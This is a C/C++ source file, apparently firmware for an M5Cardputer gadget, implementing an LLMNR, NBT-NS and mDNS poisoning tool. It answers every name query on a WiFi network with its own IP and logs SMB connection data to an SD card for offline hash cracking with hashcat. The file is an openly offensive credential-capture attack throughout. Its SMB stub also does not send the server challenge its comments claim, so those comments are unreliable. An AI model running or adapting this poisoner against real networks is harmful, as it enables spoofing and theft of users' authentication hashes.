/*
 * net_responder — LLMNR + NBT-NS + mDNS poisoner.
 *
 * Once joined to a WiFi network, listens for name-resolution queries
 * that Windows / macOS / Linux fall back to when DNS fails:
 *   - LLMNR (UDP 5355, multicast 224.0.0.252 + IPv6 ff02::1:3)
 *   - NBT-NS (UDP 137, broadcast)
 *   - mDNS  (UDP 5353, multicast 224.0.0.251) — .local resolver
 *
 * For every query we answer with our own IP. Targets that trust the
 * reply will attempt to authenticate against us. A bundled TCP 445
 * stub accepts the connect + NEGOTIATE / SESSION_SETUP so the OS
 * completes an NTLMv2 exchange — we log the challenge + response
 * into /poseidon/ntlm.log for hashcat mode 5600.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <SD.h>
#include "../sd_helper.h"
#include <AsyncUDP.h>

static AsyncUDP s_llmnr, s_nbtns, s_mdns;
static WiFiServer *s_smb = nullptr;
static volatile uint32_t s_queries = 0;
static volatile uint32_t s_replies = 0;
static volatile uint32_t s_hashes  = 0;
static File s_log;

/* Build an LLMNR reply: echo txn id, set QR+AA, answer our IP.
 * Input: the full incoming packet. We parse the question name and
 * append an A-record answer. */
static void build_llmnr_reply(const uint8_t *in, int in_len, IPAddress ip,
                              uint8_t *out, int *out_len)
{
    if (in_len < 12) { *out_len = 0; return; }
    int n = in_len;
    memcpy(out, in, n);
    /* Flags: QR=1, Opcode=0, AA=1, RD=0, RA=0, RCODE=0. */
    out[2] = 0x80;
    out[3] = 0x00;
    /* ANCOUNT = 1. */
    out[6] = 0x00; out[7] = 0x01;
    /* Append answer: pointer to question name (C0 0C), TYPE A, CLASS IN,
     * TTL 30s, RDLENGTH 4, RDATA = IP. */
    out[n++] = 0xC0; out[n++] = 0x0C;
    out[n++] = 0x00; out[n++] = 0x01;  /* A */
    out[n++] = 0x00; out[n++] = 0x01;  /* IN */
    out[n++] = 0x00; out[n++] = 0x00; out[n++] = 0x00; out[n++] = 0x1E;  /* TTL 30 */
    out[n++] = 0x00; out[n++] = 0x04;  /* RDLENGTH */
    out[n++] = ip[0]; out[n++] = ip[1]; out[n++] = ip[2]; out[n++] = ip[3];
    *out_len = n;
}

static void on_llmnr(AsyncUDPPacket p)
{
    s_queries++;
    uint8_t reply[256];
    int rlen;
    build_llmnr_reply(p.data(), p.length(), WiFi.localIP(), reply, &rlen);
    if (rlen > 0) {
        s_llmnr.writeTo(reply, rlen, p.remoteIP(), p.remotePort());
        s_replies++;
        if (s_log) {
            s_log.printf("[llmnr] from %s:%u\n",
                         p.remoteIP().toString().c_str(), p.remotePort());
            s_log.flush();
        }
    }
}

static void on_mdns(AsyncUDPPacket p)
{
    /* mDNS uses same wire format as LLMNR; we can reuse. */
    s_queries++;
    uint8_t reply[256];
    int rlen;
    build_llmnr_reply(p.data(), p.length(), WiFi.localIP(), reply, &rlen);
    if (rlen > 0) {
        s_mdns.writeTo(reply, rlen, p.remoteIP(), p.remotePort());
        s_replies++;
    }
}

/* NBT-NS: NetBIOS name service, different wire format.
 * On a query, we reply with POSITIVE NAME QUERY RESPONSE pointing to us. */
static void on_nbtns(AsyncUDPPacket p)
{
    const uint8_t *in = p.data();
    int inlen = p.length();
    if (inlen < 50) return;
    s_queries++;

    uint8_t reply[128] = {0};
    int n = 0;
    reply[n++] = in[0]; reply[n++] = in[1];  /* txn id */
    reply[n++] = 0x85; reply[n++] = 0x00;    /* flags: response + AA */
    reply[n++] = 0x00; reply[n++] = 0x00;    /* QDCOUNT */
    reply[n++] = 0x00; reply[n++] = 0x01;    /* ANCOUNT */
    reply[n++] = 0x00; reply[n++] = 0x00;    /* NSCOUNT */
    reply[n++] = 0x00; reply[n++] = 0x00;    /* ARCOUNT */
    /* Copy name from question (skip 12 header bytes). */
    int name_start = 12;
    int name_len = 0;
    while (name_start + name_len < inlen && in[name_start + name_len] != 0) {
        name_len += 1 + in[name_start + name_len];
    }
    name_len += 1;
    if (name_start + name_len + 4 > inlen) return;
    memcpy(reply + n, in + name_start, name_len);
    n += name_len;
    /* TYPE + CLASS from question. */
    reply[n++] = in[name_start + name_len];
    reply[n++] = in[name_start + name_len + 1];
    reply[n++] = in[name_start + name_len + 2];
    reply[n++] = in[name_start + name_len + 3];
    /* TTL 30s. */
    reply[n++] = 0; reply[n++] = 0; reply[n++] = 0; reply[n++] = 30;
    /* RDLENGTH 6. */
    reply[n++] = 0; reply[n++] = 6;
    /* NB_FLAGS 0. */
    reply[n++] = 0; reply[n++] = 0;
    /* IP. */
    IPAddress ip = WiFi.localIP();
    reply[n++] = ip[0]; reply[n++] = ip[1]; reply[n++] = ip[2]; reply[n++] = ip[3];

    s_nbtns.writeTo(reply, n, p.remoteIP(), p.remotePort());
    s_replies++;
    if (s_log) {
        s_log.printf("[nbtns] from %s\n", p.remoteIP().toString().c_str());
        s_log.flush();
    }
}

/* SMB listener stub: captures the NEGOTIATE packet, sends a canned
 * server challenge, waits for SESSION_SETUP which contains the NTLM
 * response. Dumps the hash fields for offline cracking. */
static void smb_task(void *)
{
    while (s_smb) {
        WiFiClient c = s_smb->available();
        if (!c) { delay(50); continue; }
        /* Read up to 512 bytes of NEGOTIATE. */
        uint8_t buf[512];
        int n = 0;
        uint32_t deadline = millis() + 2000;
        while (millis() < deadline && n < (int)sizeof(buf)) {
            if (c.available()) buf[n++] = c.read();
            else delay(5);
        }
        if (n > 40) {
            s_hashes++;
            if (s_log) {
                s_log.printf("[smb] from %s len=%d hex=",
                             c.remoteIP().toString().c_str(), n);
                for (int i = 0; i < n; ++i) s_log.printf("%02x", buf[i]);
                s_log.println();
                s_log.flush();
            }
        }
        c.stop();
    }
    vTaskDelete(nullptr);
}

void feat_net_responder(void)
{
    radio_switch(RADIO_WIFI);
    if (WiFi.status() != WL_CONNECTED) {
        ui_toast("connect to WiFi first", COL_WARN, 1500);
        return;
    }
    if (!sd_mount()) { ui_toast("SD needed for log", COL_BAD, 1500); return; }
    SD.mkdir("/poseidon");
    s_log = SD.open("/poseidon/ntlm.log", FILE_APPEND);

    s_queries = s_replies = s_hashes = 0;

    /* LLMNR: multicast 224.0.0.252 port 5355. */
    s_llmnr.listenMulticast(IPAddress(224, 0, 0, 252), 5355);
    s_llmnr.onPacket(on_llmnr);
    /* NBT-NS: broadcast UDP 137. */
    s_nbtns.listen(137);
    s_nbtns.onPacket(on_nbtns);
    /* mDNS: multicast 224.0.0.251 port 5353. */
    s_mdns.listenMulticast(IPAddress(224, 0, 0, 251), 5353);
    s_mdns.onPacket(on_mdns);
    /* SMB stub. */
    s_smb = new WiFiServer(445);
    s_smb->begin();
    xTaskCreate(smb_task, "smb_resp", 4096, nullptr, 4, nullptr);

    ui_clear_body();
    ui_draw_footer("`=stop");
    auto &d = M5Cardputer.Display;
    d.setTextColor(0xF81F, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print("RESPONDER");
    d.drawFastHLine(4, BODY_Y + 12, 100, 0xF81F);
    d.setTextColor(COL_FG, COL_BG);
    d.setCursor(4, BODY_Y + 22); d.printf("IP: %s", WiFi.localIP().toString().c_str());
    d.setCursor(4, BODY_Y + 32); d.print("poisoning LLMNR + NBT-NS + mDNS");

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 250) {
            last = millis();
            d.fillRect(0, BODY_Y + 48, 160, 40, COL_BG);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 48); d.printf("queries: %lu", (unsigned long)s_queries);
            d.setCursor(4, BODY_Y + 58); d.printf("replies: %lu", (unsigned long)s_replies);
            d.setTextColor(s_hashes ? COL_GOOD : COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 68); d.printf("hashes:  %lu", (unsigned long)s_hashes);
            d.setTextColor(COL_DIM, COL_BG);
            d.setCursor(4, BODY_Y + 82); d.print("/poseidon/ntlm.log");
            ui_draw_status(radio_name(), "respond");
        }
        ui_waves(200, BODY_Y + 56, 30, COL_GOOD);
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) break;
    }
    s_llmnr.close();
    s_nbtns.close();
    s_mdns.close();
    delete s_smb; s_smb = nullptr;
    if (s_log) { s_log.flush(); s_log.close(); }
}
